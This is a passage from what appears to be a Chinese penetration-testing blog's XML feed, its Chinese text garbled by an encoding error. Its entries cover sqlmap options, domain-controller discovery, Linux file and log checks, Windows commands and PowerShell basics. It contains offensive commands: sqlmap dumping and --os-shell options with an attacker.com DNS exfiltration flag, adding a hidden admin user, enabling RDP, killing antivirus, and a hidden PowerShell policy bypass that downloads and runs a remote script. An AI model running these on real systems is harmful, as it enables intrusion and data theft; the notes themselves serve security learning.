æŒ‡å®šæ‰«æå‚æ•°ï¼ˆå³å­˜åœ¨æ³¨å…¥çš„é‚£ä¸ªå‚æ•°ï¼‰ï¼Œä½¿ --levelå¤±æ•ˆ --skip="name, user-agent" # æ’é™¤æŒ‡å®šçš„æ‰«æå‚æ•° --dbms # åˆ¤æ–­æ•°æ®åº“ç±»å‹ --dbms="mysql" # æŒ‡å®šåªç”¨mysqlçš„æ–¹æ³•è¿›è¡Œæ³¨å…¥ --os='' # æŒ‡å®šç³»ç»Ÿ --invalid-bignum / --invalid-logical # bignumä½¿ç”¨å¤§æ•°ä½¿å‚æ•°å€¼å¤±æ•ˆid=99999999ï¼› logical ä½¿ç”¨å¸ƒå°”åˆ¤æ–­ä½¿å–å€¼å¤±æ•ˆ id=13 AND 18=19 --no-cast # æ¦¨å–æ•°æ®æ—¶ï¼Œsqlmapå°†æ‰€æœ‰ç»“æœè½¬æ¢ä¸ºstrï¼Œå¹¶å°†ç©ºæ ¼æ›¿æ¢NULLç»“æœ --no-escape # å…³é—­åŠŸèƒ½ï¼šï¼ˆå½“payloadä¸­ç”¨å•å¼•å·ç•Œå®šstræ—¶ï¼Œsqlmapä½¿ç”¨char()ç¼–ç é€ƒé€¸çš„æ–¹æ³•æ›¿æ¢strï¼‰ --prefix # å‰ç¼€ --suffix # åç¼€ â€œ...?id=1â€ -p id --prefix"')" --suffix "AND ('abc'='abc" --tamper="xxxxx, yyyyyy, zzzzzz" # æ··æ·†è„šæœ¬(å¯è‡ªå®šä¹‰è„šæœ¬)ï¼ŒæŸ“è¿‡åº”ç”¨å±‚è¿‡æ»¤ï¼Œipsï¼Œwaf ä½ç½®:/usr/share/sqlmaptamper #ä¼ªé™æ€æ³¨å…¥(å…¨æ˜¯æ–œçº¿ï¼Œä½¿ç”¨â€œ*â€ç¬¦å·æ¥è‡ªå®šä¹‰æ³¨å°„ä½ç½®) sqlmap -u "http://www.xxx.com/123/456*/789" -v 4 â€‹ 10. TechniquesæŠ€æœ¯ #é»˜è®¤ä½¿ç”¨å…¨éƒ¨æŠ€æœ¯ B: Boolean-based bind E: Error-based U: Union auery-based S: Stacked queries (æ–‡ä»¶ç³»ç»Ÿï¼Œæ“ä½œç³»ç»Ÿï¼Œæ³¨å†Œè¡¨å¿…é¡») T: Time-based-bind --time-sec # åŸºäºæ—¶é—´çš„æ³¨å…¥æ£€æµ‹ç›¸åº”å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤5sï¼‰ --union-cols 6-9 # é»˜è®¤è”åˆæŸ¥è¯¢1-10åˆ—ï¼Œéš--levelå¢å¤§æœ€å¤šæ”¯æŒ50åˆ— --union-char 123 # è”åˆæŸ¥è¯¢é»˜è®¤ä½¿ç”¨NULLï¼Œ æç«¯æƒ…å†µä¸‹NULLå¯èƒ½å¤±è´¥ï¼Œæ­¤æ—¶å¯ä»¥æ‰‹åŠ¨æ‰§è¡Œæ•°å€¼ --dns-domain attacker.com # æ”»å‡»è€…æ§åˆ¶äº†DNSæœåŠ¡å™¨ï¼Œä½¿ç”¨æ­¤åŠŸèƒ½å¯ä»¥æé«˜æ•°æ®æ¦¨å–é€Ÿåº¦ --second-order http://1.1.1.1/a.php # åœ¨ä¸€ä¸ªé¡µé¢æ³¨å…¥çš„ç»“æœï¼Œåœ¨å¦ä¸€ä¸ªé¡µé¢ä½“ç°å‡ºæ¥ â€‹ å°ä¾‹å­è·å–æŒ‡å®šæ•°æ®åº“ æŒ‡å®šè¡¨ æŒ‡å®šåˆ— --batch -D 'dbname' -T 'tablename' -C 'username.password' --dump ææƒæ“ä½œ # æ•°æ®åº“ææƒ --batch --sql-hell # ç³»ç»Ÿææƒ --batch --os-shell # æ‰§è¡Œç³»ç»Ÿå‘½ä»¤(å‰æè¦æœ‰æƒé™) --os-cmd=ls / æŠŠæ–‡ä»¶ä¸Šä¼ åˆ°æ•°æ®åº“æœåŠ¡å™¨ä¸­ sqlmap.py --file-write --file-dest "æœåŠ¡å™¨è·¯å¾„" document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æŸ¥æ‰¾åŸŸæ§çš„å‡ ä¸ªå¸¸ç”¨æ–¹æ³•]]></title>
    <url>%2Fposts%2F24294%2F</url>
    <content type="text"><![CDATA[æŸ¥æ‰¾åŸŸæ§çš„å‡ ä¸ªå¸¸ç”¨æ–¹æ³•1.net view net view /domain 2.set log set log 3.é€šè¿‡srvè®°å½• nslookup -type=SRV _ldap._tcp.corp 4.ä½¿ç”¨nltest nltest /dclist:corp 5.ä½¿ç”¨dsquery DsQuery Server -domain corp 6.ä½¿ç”¨netdom netdom query pdc document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>åŸŸæ§</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linuxæ‰¾å‡ºæœ€è¿‘æˆ–è€…ä»Šå¤©è¢«ä¿®æ”¹çš„æ–‡ä»¶]]></title>
    <url>%2Fposts%2F10857%2F</url>
    <content type="text"><![CDATA[å‚è€ƒï¼šhttp://www.hackdig.com/01/hack-42547.htm 0x01 åˆ—å‡ºæŸä¸ªç›®å½•ä¸‹ä»Šå¤©åˆ›å»ºæˆ–è€…ä¿®æ”¹çš„æ–‡ä»¶1 æ˜¾ç¤ºç›®å½•home/ymä¸‹ï¼Œä»Šå¤©åˆ›å»ºæˆ–è€…ä¿®æ”¹çš„æ–‡ä»¶ls -al --time-style=+%D | grep 'date +%D' å‚æ•°è§£é‡Šï¼š -a - åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ -l - å¯ç”¨é•¿åˆ—è¡¨æ ¼å¼ --time-style=FORMAT - æ˜¾ç¤ºæŒ‡å®š FORMAT çš„æ—¶é—´ +ï¼…D - ä»¥ ï¼…m/ï¼…d/ï¼…y ï¼ˆæœˆ/æ—¥/å¹´ï¼‰æ ¼å¼æ˜¾ç¤ºæˆ–ä½¿ç”¨æ—¥æœŸ-a - åˆ—å‡ºæ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶ -l - å¯ç”¨é•¿åˆ—è¡¨æ ¼å¼ --time-style=FORMAT - æ˜¾ç¤ºæŒ‡å®š FORMAT çš„æ—¶é—´ +ï¼…D - ä»¥ ï¼…m/ï¼…d/ï¼…y ï¼ˆæœˆ/æ—¥/å¹´ï¼‰æ ¼å¼æ˜¾ç¤ºæˆ–ä½¿ç”¨æ—¥æœŸ 2 æŒ‰å­—æ¯é¡ºåºå¯¹ç»“æœæ’åºæ˜¾ç¤ºls -alX --time-style=+%D | grep 'date +%D' 3 æŒ‰æ–‡ä»¶å¤§å°ä»å¤§åˆ°å°å¯¹ç»“æœæ’åºæ˜¾ç¤ºls -alS --time-style=+%D | grep 'date +%D' 0x02 åˆ—å‡ºæŸå¤©æ‰€æœ‰è¢«ä¿®æ”¹æ–‡ä»¶1 åˆ—å‡ºå½“å‰ç›®å½•ä»Šå¤©è¢«ä¿®æ”¹çš„æ–‡ä»¶find . -maxdepth 1 -newermt "2017-1-8" find . -maxdepth 1 -newermt "1/8/2017" 2 åˆ—å‡ºç³»ç»Ÿä¸­ä»Šå¤©è¢«ä¿®æ”¹çš„æ‰€æœ‰æ–‡ä»¶find . -newermt "2017-1-8" find . -newermt "1/8/2017" 0x03 æŸ¥æ‰¾è¢«è®¿é—®è¿‡çš„æ–‡ä»¶1 ä»Šå¤©è¢«è®¿é—®çš„æ–‡ä»¶find /home -atime 0 #æŸ¥çœ‹home ç›®å½•ä¸‹ä»Šå¤©è¢«è®¿é—®çš„æ–‡ä»¶ 2 æŸ¥çœ‹å‡ å¤©ä¹‹å†…è¢«è®¿é—®çš„æ–‡ä»¶find . -atime +2 # -atime n, File was last accessed n*24 hours ago.ï¼›æŸ¥çœ‹å½“å‰ç›®å½•ä¸‰å¤©ä¹‹å†…è¢«è®¿é—®çš„æ–‡ä»¶ 0x04 æŸ¥çœ‹è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶1 ä»Šå¤©è¢«è®¿é—®çš„æ–‡ä»¶find /home -ctime 0 #æŸ¥çœ‹home ç›®å½•ä¸‹ä»Šå¤©è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶ 2 æŸ¥çœ‹å‡ å¤©ä¹‹å†…è¢«è®¿é—®çš„æ–‡ä»¶find . -ctime +2 # -ctime n, File was last changed n*24 hours ago.ï¼›æŸ¥çœ‹å½“å‰ç›®å½•ä¸‰å¤©ä¹‹å†…è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶ 0x05 æ›´å¤šæŸ¥çœ‹æ–‡ä»¶çš„ç”¨æ³•â€¦ â€¦ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxä¸‹é¢ä¸€äº›å®‰å…¨æ—¥å¿—æ–‡ä»¶]]></title>
    <url>%2Fposts%2F62677%2F</url>
    <content type="text"><![CDATA[æ–‡ä»¶ /var/run/utmp è®°å½•ç°åœ¨ç™»å…¥çš„ç”¨æˆ· æ–‡ä»¶ /var/log/wtmp è®°å½•ç”¨æˆ·æ‰€æœ‰çš„ç™»å…¥å’Œç™»å‡º æ–‡ä»¶ /var/log/lastlog è®°å½•æ¯ä¸€ä¸ªç”¨æˆ·æœ€åç™»å…¥æ—¶é—´ æ–‡ä»¶ /var/log/btmp è®°å½•é”™è¯¯çš„ç™»å…¥å°è¯•ï¼ˆæ³¨ï¼šå¯ä»¥æŸ¥çœ‹ç”µè„‘æ˜¯å¦æ­£åœ¨è¢«çˆ†ç ´ï¼‰ æ–‡ä»¶ /var/log/auth.log éœ€è¦èº«ä»½ç¡®è®¤çš„æ“ä½œ(å¯èƒ½å­˜åœ¨) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>æ—¥å¿—</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windowså‘½ä»¤ç®€è®°]]></title>
    <url>%2Fposts%2F434%2F</url>
    <content type="text"><![CDATA[1ã€windowsç³»ç»ŸåŸºç¡€å‘½ä»¤ipconfig /all è·å–ipåœ°å€ linuxï¼šifconfig -a Route print è·¯ç”±ä¿¡æ¯ Arp -a arpç¼“å­˜ Netsh firewall show config æŸ¥çœ‹é˜²ç«å¢™è§„åˆ™ Netsh firewall show state Netstat -an è·å–ç«¯å£ä¿¡æ¯ Whoami å½“å‰ç”¨æˆ·æƒé™ Hostname ä¸»æœºåç§° Set ç¯å¢ƒå˜é‡ Query user æŸ¥çœ‹è¿œç¨‹ç»ˆç«¯åœ¨çº¿ç”¨æˆ· Systeminfo è·å–æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€ç±»å‹ã€ä½æ•°ç­‰ç›¸å…³ä¿¡æ¯ã€å®‰è£…ï¼› ïƒ¼-bï¼š æ˜¾ç¤ºåŒ…å«äºå¸¸è§æ¯ä¸ªé“¾æ¥æˆ–ç›‘å¬ç«¯å£çš„å¯æ‰§è¡Œç»„ä»¶ï¼› ïƒ¼-oï¼š æ˜¾ç¤ºä¸æ¯ä¸ªè¿æ¥ç›¸å…³çš„æ‰€å±è¿›ç¨‹IDï¼› ïƒ¼-vï¼š ä¸bä¸€èµ·ä½¿ç”¨æ—¶å°†æ˜¾ç¤ºåŒ…å«äºä¸ºæ‰€æœ‰å¯æ‰§è¡Œç»„ä»¶åˆ›å»ºè¿æ¥æˆ–è€…ç›‘å¬ç«¯å£çš„ç»„ä»¶ï¼› Netstat -anb è¿›ç¨‹å·ã€ç«¯å£å¼€æ”¾æƒ…å†µã€å¼€æ”¾ç«¯å£ç¨‹åºã€ç›‘å¬ç«¯å£ç»„ä»¶ Netsata -ano tcp/udpåè®®ä¿¡æ¯ã€ç«¯å£ã€è¿›ç¨‹å· Netstat -anvb è¿›ç¨‹å·ã€ç«¯å£æ‰€ç”¨åè®®ã€è°ƒç”¨çš„å¯æ‰§è¡Œç»„ä»¶ã€ç¬¬ä¸‰æ–¹è¿›ç¨‹çš„ç³»ç»Ÿè·¯å¾„ç­‰ Net start è·å–æœåŠ¡ä¿¡æ¯åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¼æ´ææƒã€å…³é—­æ€æ¯’è½¯ä»¶ã€é˜²ç«å¢™ã€ä»¥åŠå…³é—­æŸäº›é˜²æŠ¤è¿›ç¨‹ Net stop servicesname åœæ­¢æœåŠ¡å‘½ä»¤ Net start servicename å¼€å¯æœåŠ¡å‘½ä»¤ Tasklist /svc è·å–è¿è¡Œçš„è¿›ç¨‹åç§°ã€æœåŠ¡ã€PID Driverquery æŸ¥çœ‹å·²å®‰è£…é©±åŠ¨ç¨‹åºåˆ—è¡¨ Net start æŸ¥çœ‹å·²ç»å¯åŠ¨çš„windowsæœåŠ¡ Msinfo32 è·å–æ›´åŠ è¯¦ç»†çš„ä¿¡æ¯ Taskkill æ˜¯windowsè‡ªå¸¦çš„ç»ˆæ­¢è¿›ç¨‹ç¨‹åº TASKKILL [/S system [/U username [/P [password]]]]{ [/FI filter] [/PID processid | /IM imagename] } [/T] [/F] #ä¾‹å¦‚ï¼štaskkill /pid 452 /f taskkill /im 360tray /f #ç”¨æˆ·ç®¡ç†å‘½ä»¤ï¼š Net user hack 123 /add æ·»åŠ hackç”¨æˆ· å¯†ç ä¸º123 Net localgroup adminnistrators hack /add æ·»åŠ hackä¸ºç®¡ç†å‘˜æƒé™ Net localgroup adminnistrators æŸ¥çœ‹å½“å‰ç³»ç»Ÿç®¡ç†å‘˜ Net localgroup "remote desktop users" hack /add åŠ å…¥è¿œç¨‹æ¡Œé¢ç”¨æˆ·ç»„ Net user hack æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„ä¿¡æ¯ Net user guest /active:yes æ¿€æ´»guestç”¨æˆ· Net user guest 123 2ã€windowsç³»ç»Ÿå¼€å¯è¿œç¨‹æ¡Œé¢ï¼ˆmstsc/rdesktopï¼‰#XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016ï¼ˆ0ï¼šONã€1ï¼šOFFï¼‰ï¼š REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f #Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016ï¼šï¼ˆ0ï¼šONã€1ï¼šOFFï¼‰ï¼š wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 #Winserver2008/2012/Win2k3/win7 wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1 #Winserver2008/2012/ wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1 #XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016ï¼ˆMetasploitï¼‰ï¼š meterpreter > run getgui -e 3ã€æŸ¥çœ‹è¿œç¨‹ç«¯å£é€šè¿‡æ³¨å†Œè¡¨æŸ¥çœ‹ï¼šREG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber æŸ¥è¯¢rdpç«¯å£å· set /a port = query hex value é€šè¿‡å‘½ä»¤æŸ¥çœ‹Tasklist /svc |find "TermService" Netstat -ano |find "1980" æœ¬æ–‡è½¬è½½ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>æ¸—é€æµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Windowså‘½ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PowerShellåŸºç¡€çŸ¥è¯†]]></title>
    <url>%2Fposts%2F21874%2F</url>
    <content type="text"><![CDATA[PowerShellæŠ€æœ¯æ¦‚å­¦ æœ¬æ–‡å†…å®¹è¾ƒçç¢ï¼Œæ€è·¯è¾ƒæ··ä¹±ï¼Œä»…å½“å…¥é—¨å°å°å°åŸºç¡€å§ PowershellåŸºç¡€ç‰¹ç‚¹ å¯ä»¥é¢å‘å¯¹è±¡ ç»‘å®š.net å…¼å®¹æ€§å¥½ çµæ´» åŸºæœ¬å¸¸è¯† åœ¨PowerShellä¸‹ï¼Œç±»ä¼¼ cmdå‘½ä»¤ å«ä½œcmdlet å‘½ä»¤è§„èŒƒï¼šåŠ¨è¯-åè¯ ï¼Œ ä¸åŒºåˆ†å¤§å°å†™ å¯ä»¥ç›´æ¥åœ¨cmdä¸­è¿è¡Œpowershellæ¥æ‰“å¼€ æŸ¥çœ‹PowerShellç‰ˆæœ¬Get-Host æˆ–è€… $PSversionTable.PSVERSION ps1æ–‡ä»¶ï¼š ä¸€ä¸ªPowerShellè„šæœ¬å…¶å®å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–‡æœ¬æ–‡ä»¶ è¿è¡Œè„šæœ¬1.å®Œæ•´è·¯å¾„2.å½“å‰è·¯å¾„:./test.ps1 åŸºæœ¬å‘½ä»¤Get-Command ï¼š å¾—åˆ°æ‰€æœ‰PowerShellå‘½ä»¤ Get-Process ï¼š è·å–æ‰€æœ‰è¿›ç¨‹ Get-Help ï¼š æ˜¾ç¤ºæœ‰å…³ Windows PowerShell å‘½ä»¤å’Œæ¦‚å¿µçš„ä¿¡æ¯ Get-History ï¼š è·å–åœ¨å½“å‰ä¼šè¯ä¸­è¾“å…¥çš„å‘½ä»¤çš„åˆ—è¡¨ Get-Job ï¼š è·å–åœ¨å½“å‰ä¼šè¯ä¸­è¿è¡Œçš„ Windows PowerShell åå°ä½œä¸š dir â€“r æ‰§è¡Œç­–ç•¥Get-ExecutionPolicy #æŸ¥çœ‹å½“å‰ç­–ç•¥ - Restricted #è„šæœ¬ä¸èƒ½è¿è¡Œï¼ˆé»˜è®¤ï¼‰ - RemoteSigned #æœ¬åœ°åˆ›å»ºçš„è„šæœ¬å¯ä»¥è¿è¡Œï¼Œä½†ä»ç½‘ä¸Šä¸‹è½½çš„è„šæœ¬ä¸èƒ½è¿è¡Œ - AllSigned #ä»…å½“è„šæœ¬ç”±ä¿¡ä»»çš„å‘å¸ƒè€…ç­¾åæ—¶æ‰èƒ½è¿è¡Œ - Unrestricted #å…è®¸æ‰€æœ‰çš„è„šæœ¬è¿è¡Œ ç»•è¿‡æœ¬åœ°æƒé™æ‰§è¡Œè„šæœ¬powershell.exe -ExexutionPolicy ByPass -File xxx.ps1 # -ExexutionPolicy ByPass ç»•è¿‡æ‰§è¡Œå®‰å…¨ç­–ç•¥ æœ¬åœ°éšè—ç»•è¿‡æƒé™æ‰§è¡Œè„šæœ¬powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoLogo -Nolnteractive -NoProfile -File xxx.ps1 # -WindowStyle Hidden éšè—çª—å£ # -NoLogo å¯åŠ¨ä¸æ˜¾ç¤ºç‰ˆæƒæ ‡å¿—çš„PowerShell ç”¨IEXä¸‹è½½è¿œç¨‹PS1è„šæœ¬ç»•è¿‡æƒé™æ‰§è¡Œè„šæœ¬powershell.exe -ExexutionPolicy ByPass -WindowStyle Hidden -NoProfile -NonI IEX(New-ObjectNet.WebClient).DownloadString("xxx.ps1");[Parameters] # -NonI éäº¤äº’æ¨¡å¼ # -NoProfile / -NoP ä¸åŠ è½½å½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ # Noexit æ‰§è¡Œåä¸é€€å‡ºShell ï¼ˆè¿™åœ¨ä½¿ç”¨é”®ç›˜è®°å½•ç­‰è„šæœ¬æ—¶éå¸¸é‡è¦ï¼‰ å¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯è¿›è¡Œæ•°å­—è®¡ç®—â€¦..ç¬‘æ­» è‡ªå®šä¹‰Powershellæ§åˆ¶å°å³é”®è‡ªå·±çœ‹ç€è‡ªå·±çš„ä¹ æƒ¯è°ƒæ•´å§ç¼–è¾‘é€‰é¡¹ï¼š å¿«é€Ÿç¼–è¾‘é€‰é¡¹ï¼ˆæ“ä½œå¿«ä¸”æ–¹ä¾¿ï¼‰ æ ‡å‡†ç¼–è¾‘é€‰é¡¹ Powershellå¿«æ·é”®ä¸linuxä¸­ç›¸ä¼¼ alt+F7 #æ¸…é™¤å‘½ä»¤çš„å†å²è®°å½• PgUp PgDn #ç¿»é¡µçš„æ•ˆæœ Esc #æƒ…å†µå‘½ä»¤è¡Œï¼ˆæˆ‘è¿˜æ˜¯å–œæ¬¢ ^Lï¼‰ Home #ç§»åŠ¨åˆ°å‘½ä»¤è¡Œæœ€å·¦ç«¯ End #ç§»åŠ¨åˆ°å‘½ä»¤è¡Œæœ€å³ç«¯ Powershellç®¡é“å’Œé‡å®šå‘åŸºäºå¯¹è±¡çš„ ç®¡é“ï¼š #æ‰¾å­—ç¬¦ä¸² ls | findstr "an" # æŸ¥çœ‹nameåˆ— ls | Format-table name # è¿˜å¯ä»¥sortç­‰ `get-process p* | stop-process` # æ‰¾åˆ°p...çš„è¿›ç¨‹ï¼Œç„¶ååœæ­¢ é‡å®šå‘ï¼š # >, >> #é‡å®šå‘åˆ°æ–‡ä»¶ä¸­ ls | Format-table name >> test.txt Powershellæ•°å­¦è¿ç®—ç›´æ¥åœ¨ç»ˆç«¯æ‰§è¡Œå³å¯ï¼Œæ— éœ€å¤šè®² è¿›è¡Œå­˜å‚¨å•ä½æ¢ç®—ï¼š è¿ç®—/æ¯”è¾ƒ #è¿ç®— 1gb/1mb*18kb # æ¯”è¾ƒ 1gb -gt 1mb è¿›åˆ¶è½¬æ¢ï¼Œæ¯”å¦‚åå…­è¿›åˆ¶ï¼š0xa Powershellæ‰§è¡Œå¤–éƒ¨å‘½ä»¤æ‰“å¼€åº”ç”¨ #ç›´æ¥æ‰“å¼€ notepad #æˆ–è€…å¸¦åŒå¼•å· &amp;"notepad" # ç›´æ¥æ‰“å¼€æœåŠ¡ services.exe # æŸ¥çœ‹ç¯å¢ƒå˜é‡ $env:path # ä»…åœ¨å½“å‰ç»ˆç«¯è®¾ç½®ç¯å¢ƒå˜é‡ï¼ˆä¸´æ—¶ç”Ÿæ•ˆï¼‰ $env$path=$env$path+"è·¯å¾„" Powershellå‘½ä»¤é›† ä¸€èˆ¬æ˜¯åŠ¨è¯-åè¯ç»“æ„ æŸ¥çœ‹æ‰€æœ‰å‘½ä»¤ï¼šGet-CommandæŸ¥çœ‹å‘½ä»¤å¸®åŠ©: get-helpæŸ¥çœ‹å‘½ä»¤å†å²ï¼šget-history Powershellåˆ«åä½¿ç”¨ # æŸ¥çœ‹æ‰€æœ‰åˆ«å get-alias # å¯ä»¥æŸ¥çœ‹å‘½ä»¤åˆ«å get-help å‘½ä»¤ # æŸ¥çœ‹åˆ«åå¯¹åº”çš„çœŸå®çš„å‘½ä»¤ get-alias -name ls # æ‰¾å‡ºä»¥removeå¼€å¤´çš„åˆ«å(): get-alias | where {$_.definition.startswitch("Remove")} # æŸ¥è¯¢æ‰€æœ‰åˆ«åæœ€å¤šçš„ï¼Œå¹¶æ’åº get-alias |group-object definition |sort -descending Count è‡ªå®šä¹‰åˆ«å # ä¸´æ—¶å®šä¹‰ï¼ˆé€€å‡ºç»ˆç«¯å°±ä¸ç”Ÿæ•ˆäº†ï¼‰ set-alias -name pad -value notepad` # åˆ é™¤åˆ«å del alias pad ## æ°¸ä¹…è®¾ç½®åˆ«åï¼ˆå†™å…¥Windows PowerShell profileæ–‡ä»¶ï¼‰ #1.æŸ¥çœ‹æ­¤æ–‡ä»¶åœ¨è®¡ç®—æœºä¸­çš„ä½ç½®ï¼š $profile #2.ä¸€èˆ¬è¯¥æ–‡ä»¶åœ¨æ²¡æœ‰åˆ›å»ºå‰æ˜¯ä¸å­˜åœ¨çš„ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä¸ºå½“å‰ç”¨æˆ·åˆ›å»ºprofileå‘½ä»¤å¹¶è¿”å›æ–‡ä»¶åœ°å€ï¼š New-Item -Type file -Force $profile #3.æ‰“å¼€æ–‡ä»¶å°†ä¸€äº›å†…å®¹å†™å…¥æ–‡ä»¶ï¼Œåˆ›å»ºåˆ«åï¼Œæ¯”å¦‚; Set-Alias notepad++ "C:\Development Kit\Notepad++\notepad++.exe" # å¯¼å‡ºåˆ«å export-alias demp.ps1 # å¯¼å…¥åˆ«å import-alias -force demo.ps1 Powershellå˜é‡å˜é‡åŸºç¡€ #å®šä¹‰å˜é‡ $name="hhh" #æ‰“å° ç›´æ¥$name # Note: å¤§å°å†™ä¸æ•æ„Ÿï¼Œæ‰€ä»¥ç‰¹æ®Šå˜é‡å°½é‡ç”¨èŠ±æ‹¬å· ${"i am a boy"}="ggggg" # å¯ä»¥ç›´æ¥è¿ç®— $n=(2+8*10)/2 # å¤šä¸ªå˜é‡åŒæ—¶å€¼ $n1=$n2=1 $m, $n=1, 2 #è°ƒæ¢å˜é‡å€¼ $n1, $n2=$n2, $n1 å˜é‡æ“ä½œ # æŸ¥çœ‹å˜é‡æ˜¯å¦å­˜åœ¨ test-path test-path variable:$n1 # åˆ é™¤å˜é‡ del variable:$n1 remove-variable ## powershellæä¾›äº†äº”ä¸ªä¸“é—¨ç®¡ç†å˜é‡çš„å‘½ä»¤ Clear-Variable Get-Variable New-Variable Remove-Variable Set-Variable ### å˜é‡å†™ä¿æŠ¤ï¼ˆåªè¯»ï¼‰ #1.è®¾ç½® $server = '10.10.10.10' Set-Variable server -option Readonly #2.æ–°å»ºæ—¶ New-Variable nu1 -Value 100 -Force -Option readonly #ä¸Šé¢çš„å˜é‡ä¸èƒ½æ›´æ”¹ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åˆ é™¤å˜é‡(del Variable:num -Force)ï¼Œå†é‡æ–°åˆ›å»ºå˜é‡æ›´æ–°å˜é‡å†…å®¹ã€‚ # é€‰é¡¹Constantï¼Œå¸¸é‡ä¸€æ—¦å£°æ˜ï¼Œä¸å¯ä¿®æ”¹ new-variable num -Value "strong" -Option constant è‡ªåŠ¨åŒ–å˜é‡1.ç”¨æˆ·ä¿¡æ¯ï¼šä¾‹å¦‚ç”¨æˆ·çš„æ ¹ç›®å½•$home2.é…ç½®ä¿¡æ¯:ä¾‹å¦‚powershellæ§åˆ¶å°çš„å¤§å°ï¼Œé¢œè‰²ï¼ŒèƒŒæ™¯ç­‰ã€‚3.è¿è¡Œæ—¶ä¿¡æ¯ï¼šä¾‹å¦‚ä¸€ä¸ªå‡½æ•°ç”±è°è°ƒç”¨ï¼Œä¸€ä¸ªè„šæœ¬è¿è¡Œçš„ç›®å½•ç­‰ã€‚ # æ¯”å¦‚ï¼šç»ˆç«¯ä¸€æ‰“å¼€å°±è‡ªåŠ¨åŠ è½½çš„å˜é‡ # ç”¨æˆ·æ ¹ç›®å½• $home # è·Ÿlinuxä¸‹åŸºæœ¬ä¸€æ · $$ #åŒ…å«ä¼šè¯æ‰€æ”¶åˆ°çš„æœ€åä¸€è¡Œä¸­çš„æœ€åä¸€ä¸ªä»¤ç‰Œã€‚ $^ #åŒ…å«ä¼šè¯æ‰€æ”¶åˆ°çš„æœ€åä¸€è¡Œä¸­çš„ç¬¬ä¸€ä¸ªä»¤ç‰Œã€‚ $? #ä¸Šä¸€ä¸ªå‘½ä»¤çš„è¿”å›å€¼ $_ #åŒ…å«ç®¡é“å¯¹è±¡ä¸­çš„å½“å‰å¯¹è±¡ $pid #è¿›ç¨‹id $null $Host $LastExitCode #åŒ…å«è¿è¡Œçš„æœ€åä¸€ä¸ªåŸºäº Windows çš„ç¨‹åºçš„é€€å‡ºä»£ç ã€‚ å‚è€ƒï¼šè¿™é‡Œ ç¯å¢ƒå˜é‡ #æŸ¥çœ‹ç¯å¢ƒå˜é‡ ls env ls env:name 